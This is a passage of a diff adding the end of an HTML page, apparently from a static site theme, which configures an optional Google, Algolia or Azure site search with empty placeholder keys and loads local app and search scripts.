+  var AZURE_QUERY_KEY = "";
+  var SEARCH_SERVICE = "";
+  var universalSearchConfig = {};
+  if (SEARCH_SERVICE === 'google') {
+    universalSearchConfig = {
+      searchService: SEARCH_SERVICE,
+      apiKey: GOOGLE_CUSTOM_SEARCH_API_KEY,
+      engineId: GOOGLE_CUSTOM_SEARCH_ENGINE_ID,
+      imagePath: "/img/"
+    };
+  } else if (SEARCH_SERVICE === 'algolia') {
+    universalSearchConfig = {
+      searchService: SEARCH_SERVICE,
+      apiKey: ALGOLIA_API_KEY,
+      appId: ALGOLIA_APP_ID,
+      indexName: ALGOLIA_INDEX_NAME,
+      imagePath: "/img/"
+    };
+  } else if (SEARCH_SERVICE === 'azure') {
+    universalSearchConfig = {
+      searchService: SEARCH_SERVICE,
+      serviceName: AZURE_SERVICE_NAME,
+      indexName: AZURE_INDEX_NAME,
+      apiKey: AZURE_QUERY_KEY,
+      imagePath: "/img/"
+    };
+  }
+</script>
+
+<script src="/js/app.js"></script>
+
+
+<script src="/js/search.js"></script>
+
+
+
+
+
+<script>setLoadingBarProgress(100);</script>
+
+</body>
+</html>
